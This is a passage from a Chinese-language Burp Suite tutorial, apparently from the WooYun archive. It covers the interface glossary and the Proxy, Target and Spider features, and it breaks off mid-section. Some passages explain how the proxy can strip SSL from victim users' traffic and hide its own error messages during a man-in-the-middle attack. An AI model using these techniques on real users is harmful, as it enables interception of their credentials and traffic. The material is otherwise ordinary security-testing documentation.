|           |                                        |                 |\n| Burp                           | BurpSuite | save state wizard                      | 保存状态向导          |\n| restore state                  | 恢复状态      | Remember setting                       | 记住设置            |\n| restore defaults               | 恢复默认      | Intruder                               | 入侵者             |\n| Start attack                   | 开始攻击(爆破)  | Actively scan defined insertion points | 定义主动扫描插入点       |\n| Repeater                       | 中继器       | New tab behavior                       | 新标签的行为          |\n| Automatic payload positions    | 自动负载位置    | config predefined payload lists        | 配置预定义的有效载荷清单    |\n| Update content-length          | 更新内容长度    | unpack gzip/deflate                    | 解压gzip/放弃       |\n| Follow redirections            | 跟随重定向     | process cookies in redirections        | 在重定向过程中的cookies |\n| View                           | 视图        | Action                                 | 行为              |\n| ### 功能项                        |           |                                        |                 |\n| Target                         | 目标        | Proxy                                  | 代理              |\n| Spider                         | 蜘蛛        | Scanner                                | 扫描              |\n| Intruder                       | 入侵者       | Repeater                               | 中继器             |\n| Sequencer                      | 定序器       | Decoder                                | 解码器             |\n| Comparer                       | 比较器       | Extender                               | 扩展              |\n| Options                        | 设置        | Detach                                 | 分离              |\n| Filter                         | 过滤器       | SiteMap                                | 网站地图            |\n| Scope                          | 范围        | Filter by request type                 | 通过请求过滤          |\n| Intercept                      | 拦截        | response Modification                  | 响应修改            |\n| match and replace              | 匹配和替换     | ssl pass through                       | SSL通过           |\n| Miscellaneous                  | 杂项        | spider status                          | 蜘蛛状态            |\n| crawler settings               | 履带式设置     | passive spidering                      | 被动蜘蛛            |\n| form submission                | 表单提交      | application login                      | 应用程序登录          |\n| spider engine                  | 蜘蛛引擎      | scan queue                             | 扫描队列            |\n| live scanning                  | 现场扫描      | live active scanning                   | 现场主动扫描          |\n| live passive scanning          | 现场被动扫描    | attack insertion points                | 攻击插入点           |\n| active scanning optimization   | 主动扫描优化    | active scanning areas                  | 主动扫描区域          |\n| passive scanning areas         | 被动扫描区域    | Payload                                | 有效载荷            |\n| payload processing             | 有效载荷处理    | select live capture request            | 选择现场捕获请求        |\n| token location within response | 内响应令牌的位置  | live capture options                   | 实时捕捉选项          |\n| Manual load                    | 手动加载      | Analyze now                            | 现在分析            |\n| Platform authentication        | 平台认证      | Upstream proxy servers                 | 上游代理服务器         |\n| Grep Extrack                   | 提取        |                                        |                 |\n\n# Proxy功能\n\n***\n\nBurp Proxy相当于BurpSuite的心脏，通过拦截，查看和修改所有的请求和响应您的浏览器与目标Web服务器之间传递。 下面了解有关BurpProxy：\n\n![Image003](https://wooyun.js.org/images_result/images/2014101711120067021.png \"image003.png\")\n\n## Using BurpProxy http、https\n\n### http\n\n设置代理的方法：以http ie为例：\n\n```\n工具>>Internet选项>>连接>>局域网>>勾选代理服务器填写地址127.0.0.1端口8080\n```\n\n这里端口可以随便定义但是要跟burp的监听端口要一致然后保存再到Proxy的Options中添加add\n\n![Image005](https://wooyun.js.org/images_result/images/2014101711120062713.jpg \"image005.jpg\")\n\n![Image007](https://wooyun.js.org/images_result/images/2014101711120053086.jpg \"image007.jpg\")\n\n这样http协议的监听就可以了,当intercept is on表示开启拦截功能，反之\n\n![Image009](https://wooyun.js.org/images_result/images/2014101711120574272.jpg \"image009.jpg\")\n\n这样就代表拦截成功，我们可以右击send to Repeater去修改数据再发送，也可以右击改变提交请求方式(change request method)比如get或者post等功能\n\n### https\n\n```\n1.以管理员权限运行ie浏览器\n2.像http那样配置好代理 \n3.在地址栏访问https地址，单击继续 \n4.点击错误证书在这个地址栏 \n5.点击查看证书 \n6.在证书路径选项卡点击PortSwigger CA,然后再点击查看证书 \n7.在常规选项卡里点击安装证书 \n8.在证书导入向导中，选择“将所有的证书放入下列存储区” \n9.点击浏览 \n10.以当前用户或者本机计算机都可以 \n11.点击ok完成导入 \n12.重启ie（不需要以管理员权限运行） 其它浏览器差不多具体请查看官网 \n```\n\n<http://portswigger.net/burp/Help/proxy_options_installingCAcert.html>\n\n### Intercept\n\n用于显示和修改HTTP请求和响应，通过你的浏览器和Web服务器之间。在BurpProxy的选项中，您可以配置拦截规则来确定请求是什么和响应被拦截(例如，范围内的项目，与特定文件扩展名，项目要求与参数，等)。 该面板还包含以下控制：\n\n#### Forward\n\n当你编辑信息之后，发送信息到服务器或浏览器\n\n#### Drop\n\n当你不想要发送这次信息可以点击drop放弃这个拦截信息\n\n#### Interception is on/off\n\n这个按钮用来切换和关闭所有拦截。如果按钮显示Interception is On，表示请求和响应将被拦截或自动转发根据配置的拦截规则配置代理选项。如果按钮显示Interception is off则显示拦截之后的所有信息将自动转发。\n\n#### Action\n\n说明一个菜单可用的动作行为操作可以有哪些操作功能。\n\n#### Comment field\n\n为请求或响应添加注释，以便更容易在History选项卡中识别它们。\n\n![Image011](https://wooyun.js.org/images_result/images/2014101711120578170.png \"image011.png\")\n\n#### Highlight\n\n为请求或响应添加颜色，可以在history选项卡和截获中更容易发现。\n\n![Image013](https://wooyun.js.org/images_result/images/2014101711120669655.png \"image013.png\")\n\n#### History\n\n代理历史认为每个请求和响应。通过代理可以记录全部请求和响应。您可以过滤和注释这个信息来帮助管理它，并使用代理的历史来测试流程。History(代理历史)总在更新，即使你把Interception turned off(拦截关闭)，允许浏览不中断的同时还监测应用流量的关键细节。\n\n#### History Table\n\n表中显示已通过代理HTTP消息的所有请求，并且可以查看完整的你所做的任何修改和截获的信息的请求和响应。 表中包含以下字段：\n\n`# (请求索引号)、Host(主机)、Method(请求方式)、URL(请求地址)、Params(参数)、Edited(编辑)、Status(状态)、Length(响应字节长度)、MIME type(响应的MLME类型)、Extension(地址文件扩展名)、Title(页面标题)、Comment(注释)、SSL、IP(目标IP地址)、Cookies、Time(发出请求时间)、Listener port(监听端口)`。\n\n![Image015](https://wooyun.js.org/images_result/images/2014101711120687800.png \"image015.png\")\n\n您可以通过单击任何列标题进行升序或降序排列。如果您在表中双击选择一个项目地址，会显示出一个详细的请求和响应的窗口。或者右击选择 `Show new history window`\n\n![Image017](https://wooyun.js.org/images_result/images/2014101711120625578.png \"image017.png\")\n\n### Display Filter\n\nProxy histroy有一个可以用来在视图中隐藏某些内容的功能，以使其更易于分析和你感兴趣的工作内容的显示过滤。 History Table上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：\n\n![Image019](https://wooyun.js.org/images_result/images/2014101711120694811.png \"image019.png\")\n\n#### Request type\n\nShow only in-scope items--勾选则显示在范围内的项目，反之。\n\n#### MIME type\n\n您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。\n\n#### Status code\n\n您可以设定是否要显示或隐藏各种HTTP状态码响应。\n\n#### Search term\n\n您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“Negative search (消极搜索)”选项，然后不匹配的搜索词唯一的项目将被显示。\n\n#### File extension\n\n您可以设定是否要显示或隐藏指定的文件扩展名的项目。\n\n#### Annotation\n\n您可以设定是否显示使用用户提供的评论或仅亮点项目。\n\n#### Listener\n\n你可以只显示特定的监听端口上接收的项目。测试访问控制时可能有用。 如果设置一个过滤器，隐藏一些项目，这些都没有被删除，只是隐藏起来，如果你取消设置相关的过滤器将再次出现。这意味着您可以使用筛选器来帮助您系统地研究了大量代理的历史来理解各种不同的请求显示。\n\n### Annotations\n\n您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。 两种方式添加亮点： 1)使用在最左边的表列中的下拉菜单中突出显示单个项目。 2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。 两种方法添加注释： 1)双击相关条目，注释列中，添加或编辑就地评论。 2)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。 除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。\n\n### Options\n\n设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等。\n\n### Proxy Listeners\n\n代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听12.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。\n\n![Image021](https://wooyun.js.org/images_result/images/2014101711120626419.png \"image021.png\")\n\n#### 1)Binding\n\n这些设置控制Burp怎么代理监听器绑定到本地网络接口：\n\n```\nBind to port---这是将被打开侦听传入连接的本地接口上的端口。你将需要使用一个没有被绑定被其他应用程序的闲置端口。\nBind to address---这是Burp绑定到本地接口的IP地址。\n```\n\n您可以绑定到刚刚127.0.0.1接口或所有接口，或任何特定的本地IP地址。\n\n注意：如果监听器绑定到所有接口或特定的非loopback接口，那么其他计算机可能无法连接到该侦听器。这可能使他们发起出站连接，从您的IP地址发起，并以访问代理服务器历史的内容，其中可能包含敏感数据，如登录凭据。你应该只启用此当你位于一个受信任的网络上。\n\nBurpSuite让您创建多个代理服务器的侦听器，并提供了丰富的控制自己的行为的配置选项。你可能偶尔需要进行测试时不寻常的应用，或与一些非基于浏览器的HTTP客户端进行合作，利用这些选项。\n\n#### 2)Request Handling\n\n这些设置包括选项来控制是否BurpSuite重定向通过此侦听器接收到的请求：\n\n**Redirect to host** - 如果配置了这个选项，Burp会在每次请求转发到指定的主机，而不必受限于浏览器所请求的目标。需要注意的是，如果你正使用该选项，则可能需要配置匹配/替换规则重写的主机头中的请求，如果服务器中，您重定向请求预期，不同于由浏览器发送一个主机头。\n\n**Redirect to port** - 如果配置了这个选项，Burp会在每次请求转发到指定的端口，而不必受限于浏览器所请求的目标。\n\n**Force use of SSL** - 如果配置了这个选项，Burp会使用HTTPS在所有向外的连接，即使传入的请求中使用普通的HTTP。您可以使用此选项，在与SSL相关的响应修改选项结合，开展sslstrip般的攻击使用Burp，其中，强制执行HTTPS的应用程序可以降级为普通的HTTP的受害用户的流量在不知不觉中通过BurpProxy代理。\n\n注意：每一个重定向选项都可以单独使用。因此，例如，可以将所有请求重定向到一个特定的主机，同时保留原来的端口和协议在每个原始请求中使用。隐形BurpProxy的支持允许非代理感知客户端直接连接到监听。\n\n#### 3)Certificate\n\n这些设置控制呈现给客户端的SSL服务器的SSL证书。使用这些选项可以解决一些使用拦截代理时出现的SSL问题：\n\n```\n你可以消除您的浏览器的SSL警报，并需要建立SSL例外。 \n凡网页加载来自其他域的SSL保护的项目，您可以确保这些均可由浏览器加载，而不需要先手动接受每个引用的域代理的SSL证书。 \n您可以与拒绝连接到服务器，如果接收到无效的SSL证书胖客户端应用程序的工作。 \n```\n\n下列选项可用：\n\n**Use a self-signed certificate**---||-一个简单的自签名SSL证书提交给您的浏览器，它总是导致SSL警告。\n\n**Generate CA-signed per-host certificate**---||-这是默认选项。安装后，BurpSuite创造了一个独特的自签名的证书颁发机构（CA）证书，并将此计算机上使用，每次BurpSuite运行。当你的浏览器发出SSL连接到指定的主机，Burp产生该主机，通过CA证书签名的SSL证书。您可以安装BurpSuite的CA证书作为在浏览器中受信任的根，从而使每个主机的证书被接受，没有任何警报。您还可以导出其他工具或Burp的其他实例使用CA证书。\n\n**Generate a CA-signed certificate with a specific hostname**---||这类似于前面的选项;然而，Burp会产生一个单一的主机证书与每一个SSL连接使用，使用您指定的主机名。在进行无形的代理时，此选项有时是必要的，因为客户端没有发送连接请求，因此Burp不能确定SSL协议所需的主机名。你也可以安装BurpSuite的CA证书作为受信任的根。\n\n**Use a custom certificate**---||-此选项使您可以加载一个特定的证书（在PKCS＃12格式）呈现给你的浏览器。如果应用程序使用它需要特定的服务器证书（例如一个给定序列号或证书链）的客户端应该使用这个选项。\n\n#### 4)Exporting and Importing the CA Certificate\n\n您可以导出您安装特定的CA证书在其他工具或BurpSuite的其他情况下使用，并且可以导入证书Burp在当前实例使用。 您可以选择要导出的证书只（用于导入到您的浏览器或其他设备的信任），或者你可以同时导出的证书及其私钥。\n\n注意：您不应该透露的私钥证书给任何不可信的一方。拥有你的证书和密钥的恶意攻击者可能可以，即使你不使用Burp拦截浏览器的HTTPS流量。\n\n您也可以仅通过访问http\\://burp/cert在浏览器中导出证书。它使HTTPS请求您的浏览器相同的证书，但在一些移动设备上安装时，设备通过一个URL来下载它是有帮助的。\n\n### Interception Options\n\n设置控制哪些请求和响应都停滞用于查看和编辑在拦截选项卡。单独的设置将应用到请求和响应。\n\n在“Intercept”复选框确定是否有讯息拦截。如果它被选中，然后Burp应用配置的规则对每个消息，以确定它是否应该被拦截。\n\n个别规则可以激活或停用对每个规则的左边的复选框。规则可以被添加，编辑，删除，或使用按钮重新排序。规则可以在消息，包括域名， IP地址，协议， HTTP方法， URL，文件扩展名，参数，cookie ，头/主体内容，状态代码，MIME类型， HTML页面标题和代理的几乎任何属性进行配置侦听端口。您可以配置规则来只拦截项目的网址是目标范围之内的。可以使用正则表达式对定义复杂的匹配条件。\n\n规则按顺序处理，并且使用布尔运算符AND和OR组合。这些都与处理简单的“从左到右”的逻辑，其中每个算子的范围，如下所示：（所有规则之前累积的结果）和/或（当前规则的结果）所有活动的规则在每封邮件进行处理，并最终活动规则应用后的结果确定消息是否被拦截或转发的背景。“自动更新内容长度”复选框控件时，这已被用户修改是否Burp自动更新消息的Content-Length头。使用这个选项通常是必不可少的，当HTTP主体已被修改。\n\n如果有需求，可以在请求结束时自动修复丢失或多余的新行。如果编辑请求不包含标题下面一个空行，Burp会添加此。如果与含有URL编码参数的身体的编辑请求包含任何换行符在身体的末端，Burp就会删除这些。这个选项可以是有用的纠正，而手动编辑在拦截视图的要求，以避免发出无效的请求向服务器发出的错误。\n\n### Response Modification\n\n设置用于执行自动响应的修改。您可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的：\n\n```\n显示隐藏的表单字段。 （有一个子选项，以突出强调取消隐藏栏在屏幕上，便于识别。 ）\n启用已禁用的表单域\n删除输入字段长度限制\n删除的JavaScript表单验证\n```\n\n下列选项可用于禁止客户端逻辑用于测试目的（注意，这些特征并非设计用来作为NoScript的的方式进行安全防御）有用：\n\n```\n删除所有的JavaScript。\n删除<object>标记。\n```\n\n下列选项可用于提供对受害用户的流量在不知不觉中被通过BurpSuite代理sslstrip般的攻击。您可以在与听者选项强制SSL的传出请求，以有效地从用户的连接剥离SSL一起使用这些：\n\n```\n转换HTTPS为HTTP的链接。\n删除cookie安全标志。\n```\n\n### Match and Replace\n\n用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，以及任何适用的替代品制成。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则 - 这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域。\n\n在替换字符串，组可以使用其次为索引$引用。所以下面的替换字符串将包含被匹配在上述正则表达式，该标记的名称：\n\n![Image023](https://wooyun.js.org/images_result/images/2014101711120634416.png \"image023.png\")\n\n### SSL Pass Through\n\n用于指定目标Web服务器为其Burp会直接通过SSL连接。关于通过这些连接的请求或响应任何细节将在代理拦截视图或历史。\n\n通过SSL连接传递可以在这情况下是不能直接消除了客户端的SSL错误是非常有用 - 例如，在执行SSL证书钉扎的移动应用程序。如果应用程序访问多个域，或使用HTTP和HTTPS连接的混合，然后通过SSL连接到特定问题的主机仍然可以让您以正常方式使用Burp其他交通工作。\n\n如果启用该选项来自动添加客户端SSL协商失败的项目，然后BurpSuite会在客户端失败的SSL协议检测（例如，由于不承认BurpSuite的CA证书），并会自动将相关的服务器添加到SSL通通过列表。\n\n### Miscellaneous\n\n控制Burp代理的行为的一些具体细节。下列选项可用：\n\n**Use HTTP/1.0 in requests to server** - 该选项控制BurpSuite代理是否强制在请求目标服务器的HTTP 1.0版。默认设置是使用任何的HTTP版本所使用的浏览器。然而，一些遗留服务器或应用程序可能需要1.0版本才能正常工作。\n\n**Use HTTP/1.0 in responses to client** - 目前所有的浏览器都支持这两个版本1.0和HTTP 1.1 。从1.0版本开始已经减少了一些功能，迫使使用1.0版本有时会很有用，以控制浏览器的行为的各个方面，例如防止企图执行HTTP流水线。\n\n**Set response header “Connection:close”** - 这个选项也可能是有用的，以防止HTTP流水线在某些情况下。\n\n**Unpack gzip / deflate in requests** - 某些应用程序（通常是那些使用自定义客户端组件） ，压缩在请求消息体。该选项控制BurpProxy是否自动解压缩压缩请求主体。请注意，某些应用程序可能被破坏，如果他们期望的压缩体和压缩已通过Burp被删除。\n\n**Unpack gzip / deflate in responses** - 大多数浏览器接受的gzip和响应紧缩压缩的内容。该选项控制BurpSuite代理是否自动解压缩压缩响应机构。请注意，您可以经常防止服务器试图通过删除请求（可能使用BurpProxy的匹配和替换功能）的Accept-Encoding头压缩的响应。 Disable web interface at http\\://burp - 如果你不得不配置你的听众接受无保护的接口上的连接，并希望阻止他人接触到Burp浏览器控件，此选项可能有用。\n\n**Suppress Burp error messages** - 当某些错误时，默认情况下BurpSuite返回有意义的错误信息到浏览器。如果你想在隐身模式下运行Burp，履行人在这方面的中间人攻击的受害者用户，那么它可能是有用的抑制这些错误信息来掩盖一个事实，即Burp是参与。\n\n**Disable logging to history and site map** - 此选项可以防止Burp从记录任何请求到代理服务器的历史或目标站点地图。如果您使用的是Burp代理对于一些特定用途，如身份验证到上游服务器或进行匹配和替换操作，并且要避免产生内存和存储开销采伐牵扯它可能是有用的。\n\n**Enable interception at startup**- 此选项可让您设定是否在Burp时启动代理截获应该启用。您可以选择始终启用拦截，始终禁用拦截，或者从Burp上次关闭恢复设置。\n\n## Target功能\n\n目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程。\n\n### Using Burp Target\n\n在地址栏输入www\\.baidu.com，如图\n\n![Image025](https://wooyun.js.org/images_result/images/2014101711120617724.jpg \"image025.jpg\")\n\n这样看起来site map是不是很乱，则可以右击add to scope，然后点击Filter勾选Show only in-scope items，此时你再回头看Site map就只有百度一个地址了，这里filter可以过滤一些参数，show all显示全部，hide隐藏所有，如果勾选了表示不过滤\n\n![Image027](../images_result/images/2014101711120751588.jpg \"image027.jpg\")\n\n针对地址右击显示当前可以做的一些动作操作等功能。左图 针对文件右击显示当前可以做一些动作操作等功能。右图\n\n![Image029](https://wooyun.js.org/images_result/images/2014101711120751588.jpg \"image029.jpg\") ![Image031](https://wooyun.js.org/images_result/images/2014071402582281360.jpg \"image031.jpg\")\n\n### 2)Scope\n\n这个主要是配合Site map做一些过滤的功能，如图：\n\n![Image033](https://wooyun.js.org/images_result/images/2014101711120768777.png \"image033.png\")\n\nInclude in scope就是扫描地址或者拦截历史记录里右击有个add to scope就是添加到这了，也可以自己手动添加。\n\nTarget分为site map和scope两个选项卡\n\n#### SiteMap\n\n中心Site Map汇总所有的信息Burp已经收集到的有关地址。你可以过滤并标注此信息，以帮助管理它，也可以使用SiteMap来手动测试工作流程。\n\n#### Target Information\n\nSiteMap会在目标中以树形和表形式显示，并且还可以查看完整的请求和响应。树视图包含内容的分层表示，随着细分为地址，目录，文件和参数化请求的URL 。您还可以扩大有趣的分支才能看到进一步的细节。如果您选择树的一个或多个部分，在所有子分支所选择的项目和项目都显示在表视图。\n\n该表视图显示有关每个项目（URL ， HTTP状态代码，网页标题等）的关键细节。您可以根据任意列进行排序表（单击列标题来循环升序排序，降序排序，和未排序） 。如果您在表中选择一个项目，请求和响应（如适用）该项目显示在请求/响应窗格。这包含了请求和响应的HTTP报文的编辑器，提供每封邮件的详细分析。\n\n站点地图汇总所有的信息BurpSuite已经收集到的有关申请。这包括：\n\n```\n所有这一切都通过代理服务器直接请求的资源。\n已推断出通过分析响应代理请求的任何物品（前提是你没有禁用被动Spider） 。\n内容使用Spider或内容发现功能查找。\n由用户手动添加的任何项目，从其它工具的输出。\n```\n\n已请求在SiteMap中的项目会显示为黑色。尚未被请求的项目显示为灰色。默认情况下（与被动蜘蛛(passviely scan this host)启用） ，当你开始浏览一个典型的应用，大量的内容将显示为灰色之前，你甚至得到尽可能要求，因为BurpSuite发现在您所请求的内容链接到它。您可以删除不感兴趣的地址\n\n![Image035](https://wooyun.js.org/images_result/images/2014101711120832954.png \"image035.png\")\n\n#### Display Filter\n\nSitemap可以用来隐藏某些内容从视图中，以使其更易于分析和对你感兴趣的工作内容的显示过滤器 Sitemap上方的过滤栏描述了当前的显示过滤器。点击过滤器栏打开要编辑的过滤器选项。该过滤器可以基于以下属性进行配置：\n\nRequest type 你可以只显示在范围内的项目，只能与反应项目，或者带参数的请求。 MIME type 您可以设定是否显示或隐藏包含各种不同的MIME类型，如HTML，CSS或图像的响应。 Status code 您可以设定是否要显示或隐藏各种HTTP状态码响应。 Search term 您可以过滤对反应是否不包含指定的搜索词。您可以设定搜索词是否是一个文字字符串或正则表达式，以及是否区分大小写。如果您选择了“消极搜索”选项，然后不匹配的搜索词唯一的项目将被显示。 File extension 您可以设定是否要显示或隐藏指定的文件扩展名的项目。 Annotation 您可以设定是否显示使用用户提供的评论或仅亮点项目。\n\n#### Annotations\n\n通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。\n\n您可以通过添加注释和批注亮点代理历史记录项。这可能是有用的描述不同要求的目的，并标记了进一步查看。\n\n两种方式添加亮点：\n\n```\n1)使用在最左边的表列中的下拉菜单中突出显示单个项目。\n2)可以突出显示使用上下文菜单中的“亮点”项目的一个或多个选定的项目。\n两种方法添加注释：\n3)双击相关条目，注释列中，添加或编辑就地评论。\n4)发表评论使用上下文菜单中的“添加注释”项目的一个或多个选定的项目。\n```\n\n除了以上两种，您也可以注释项目，它们出现在拦截选项卡，这些都将自动出现在历史记录表。 当您已经注明想要的请求，您可以使用列排序和显示过滤器后迅速找到这些项目。\n\n#### Scope\n\nTarget scope设置，可以从SiteMap中添加也可以手动添加扫描范围到Scope。你可以在Target SiteMap和Proxy history上设置只显示在范围内的项目。并且可以设置代理拦截只有在范围内的请求和响应。Spider会扫描在范围内的地址。专业版还可以设置自动启动在范围内项目的漏洞扫描。您可以配置Intruder和Repeater跟随重定向到任何在范围内的网址。发送Burp目标以适当的方式执行行动，只针对你感兴趣并愿意攻击项目。\n\n![Image037](https://wooyun.js.org/images_result/images/2014101711120869997.png \"image037.png\")\n\n范围定义使用的URL匹配规则两个表 - 一个“包括(include)”列表和“exclude(排除)”列表中。Burp根据一个URL地址来决定，如果它是目标范围之内，这将被视为是在范围上如果URL匹配至少一个“include”在内的规则，不符合“exclude”规则。这样能够定义特定的主机和目录为大致范围内，且距离该范围特定的子目录或文件（如注销或行政职能）排除。\n\n## Spider功能\n\nBurp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。 结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序 视图。能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量 的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应 用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。\n\n### Using Burp Spider\n\n要对应用程序使用 Burp Spider 需要两个简单的步骤：\n\n```\n1 使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可 以关闭代理拦截)。 \n2 到站点地图的”target”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的” spider this host/branch”选项。\n```\n\n![Image039](https://wooyun.js.org/images_result/images/2014101711120832553.png \"image039.png\")\n\n你也可以在任何 Burp 工具的任意请求或响应上使用上下文菜单上选择” spider this item”。当你发送一个站点地图的分支来 spidering，Spider 会首先检查这个分支是否在定义好的spidering 的范围内。如果不是，Burp 会提示你是否把相关的 URL 添加到范围里。然后，Burp 开始 spidering，并执行下面的操作：\n\n在分支上，请求那些已被发现的还没被请求过的 URL。 在分支上，提交那些已被发现但提交 URL 错误的表单。 重复请求分支上的先前收到的状态码为 304 的项，为检索到一个应用程序的新(未进入缓存)副本。 对所有的检索到内容进行解析以确认新的 URL 和表单。 只有发现新内容就递归地重复这些步骤。 继续在所有的范围区域内 spidering，直到没有新内容为止。\n\n注意 Spider 会跟踪任何在当前定义的 spidering 范围内的 URL 链接。如果你定义了一个 范围比较大的目标，并且你只选择了其中的一个分支来 spidering，这时 Spider 会跟踪所有进入到这个比较大的范围内的链接，于是也就不在原来的分支上 spider。为了确保 Spider 只在指定分支内的请求上，你应该在开始时，就把 spidering 范围配置为只在这个分支上。\n\n你应该小心地使用 Burp Spider。在它的默认设置上，Spider 会在 spidering 范围内使用 默认输入值，自动地提交任意表格，并且会请求许多平常用户在只使用一个浏览器不会发出 的请求。如果在你定义范围的 URL 是用来执行敏感操作的，这些操作都会被带到应用程序 上。在你完全地开始自动探索内容之前，使用浏览器对应用程序进行一些手动的映射，是非常可取的。\n\n### Control tab\n\n这个选项是用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。\n\n#### Spider Status\n\n![Image041](https://wooyun.js.org/images_result/images/2014101711120887420.png \"image041.png\")\n\n#### 1)Spider running\n\n这个是用来开始和停止 Spider。Spider 停止后，它自己不会产生请求，但它会 继续处理通过 Burp Proxy 的响应，并且在 spidering 范围内的新发现的项都会送入请求队列 里，当 Spider 重新启动时，再来请求。这里显示的一些 Spider 进度的指标，让你能看到剩余的内容和工作量的大小。\n\n#### 2)Clear queues\n\n如果你想改变你工作的优先权，你可以完全地清除当前队列的项目，来让其他 的项目加入队列。注意如果被清除的项目如果还在范围内并且 Spider 的分析器发现有新的 链接到这个项目，那么它们还会加入队列。\n\n#### Spider Scope\n\n在这个面板里，你能精确地定义 Spider 的请求范围。最好的方法通常是使用一套广泛的目标范围，默认情况下，蜘蛛会使用该范围。如果您需要定义不同范围的蜘蛛使用，然后选择“Use custom scope(使用自定义范围)”。进一步的配置面板会出现在相同的方式套件范围的目标范围内面板的功能。如果你使用自定义范围并向 Spider 发送不在范围内 的项，则 Burp 会自动更新这个自定义的范围而不是 Suite 范围。\n\n#### Options tab\n\n这个选项里包含了许多控制 Burp Spider 动作的选项，如下描述。这些设置在 spider 启 动后还可以修改的，并且这修改对先前的结果也是有效的。例如，如果增加了最大链接深度， 在以前的最大链接深度外的链接如果满足现在的条件，也会加入到请求队列里。\n\n#### Crawler Settings\n\n![Image043](https://wooyun.js.org/images_result/images/2014101711120858563.png \"image043.png\")\n\n#### 1)check robots.txt\n\n如果这个选项被选中，Burp Spider会要求和处理robots.txt文件，提取内容链接。这个文件是由机器人排除协议控制的蜘蛛状制剂在互联网上的行为。请注意，注意 Burp Spider不会确认 robots 排除协议。Burp Spider 会列举出目标应用程序的所有内容，请求所有在范围 内的 robots.txt 条目。\n\n#### 2)detect custom \"not found\" responses\n\nHTTP协议需要向Web服务器返回404状态码，如果一个请求的资源不存在。然而，许多Web应用程序返回使用不同的状态代码定制为“not found”的网页。如果是这种情况，则使用该选项可以防止误报的网站内容的映射。Burp Spider从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测定制“not found”的回应。\n\n#### 3)ignore links to non-text content\n\n常常需要推断出在 HTML 上下文里链接到特殊资源的 MIME 类型。例如，带有 IMG 标记的 URL 会返回图像；那些带有 SCRIPT 标记的会返回 JavaScript。 如果这个选项被选中，Spider 不会请求在这个上下文出现的出现的非文本资源。使用这个选 项，会减少 spidering 时间，降低忽略掉感兴趣内容的风险。\n\n#### 4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。\n\n#### 5)make a non-parameterised request to each dynamic page\n\n如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出添加的站点内容和功能。\n\n#### 6)maximum link depth\n\n这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。\n\n#### 7)Maximum parameterized requests per URL\n\n请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容，如在URL中的日期参数的日历应用程序。\n\n## Passive Spidering(被动扫描)\n\n![Image045](https://wooyun.js.org/images_result/images/2014101711120825072.png \"image045.png\")\n\n#### 1)passively spider as you browse\n\n如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。\n\n#### 2)link depth to associate with proxy requests\n\n这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。\n\n### Form Submission\n\n![Image047](https://wooyun.js.org/images_result/images/2014101711120952125.png \"image047.png\")\n\n#### 1)individuate forms\n\n这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 